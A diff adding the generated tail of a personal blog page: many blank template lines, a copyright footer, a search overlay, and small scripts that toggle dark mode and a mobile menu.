+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+    </ul>
+  </div>
+</div>
+
+    </main><footer class="container p-6 mx-auto flex justify-between items-center">
+  <span class="text-sm font-light">
+    
+    Copyright © 2023 - Jann Moon · All rights reserved
+    
+  </span>
+  <span onclick="window.scrollTo({top: 0, behavior: 'smooth'})" class="p-1 cursor-pointer">
+    <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 24 24" stroke-width="1.5"
+      stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M18 15l-6 -6l-6 6h12" />
+    </svg>
+  </span>
+</footer>
+
+<div class="search-ui absolute top-0 left-0 w-full h-full bg-white dark:bg-gray-800 hidden">
+  <div class="container max-w-3xl mx-auto p-12">
+    <div class="relative">
+      <div class="my-4 text-center text-2xl font-bold">Search</div>
+
+      <span class="p-2 absolute right-0 top-0 cursor-pointer close-search">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="1.5"
+          stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+          <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+          <line x1="18" y1="6" x2="6" y2="18" />
+          <line x1="6" y1="6" x2="18" y2="18" />
+        </svg>
+      </span>
+    </div>
+
+    <input type="search" class="py-2 px-3 w-full dark:text-black border dark:border-transparent"
+      placeholder="Enter search query" />
+
+    <div class="search-results text-lg font-medium my-4 hidden">Results</div>
+    <ul class="search-list my-2">
+
+    </ul>
+
+    <div class="no-results text-center my-8 hidden">
+      <div class="text-xl font-semibold mb-2">No results found</div>
+      <p class="font-light text-sm">Try adjusting your search query</p>
+    </div>
+  </div>
+</div>
+
+
+
+
+
+<script src="http://anti-sec.vercel.app/js/scripts.min.js"></script>
+
+
+
+
+
+
+<script>
+  
+  const darkmode = document.querySelector('.toggle-dark-mode');
+  function toggleDarkMode() {
+    if (document.documentElement.classList.contains('dark')) {
+      document.documentElement.classList.remove('dark')
+      localStorage.setItem('darkmode', 'light')
+    } else {
+      document.documentElement.classList.add('dark')
+      localStorage.setItem('darkmode', 'dark')
+    }
+  }
+  if (darkmode) {
+    darkmode.addEventListener('click', toggleDarkMode);
+  }
+
+  const darkStorage = localStorage.getItem('darkmode');
+  const isBrowserDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
+
+  if (!darkStorage && isBrowserDark) {
+    document.documentElement.classList.add('dark');
+  }
+
+  if (darkStorage && darkStorage === 'dark') {
+    toggleDarkMode();
+  }
+</script>
+
+
+<script>
+  const mobileMenuButton = document.querySelector('.mobile-menu-button')
+  const mobileMenu = document.querySelector('.mobile-menu')
+  function toggleMenu() {
+    mobileMenu.classList.toggle('hidden');
+    mobileMenu.classList.toggle('flex');
+  }
+  if(mobileMenu && mobileMenuButton){
+    mobileMenuButton.addEventListener('click', toggleMenu)
+  }
+</script>
+</body>
+</html>
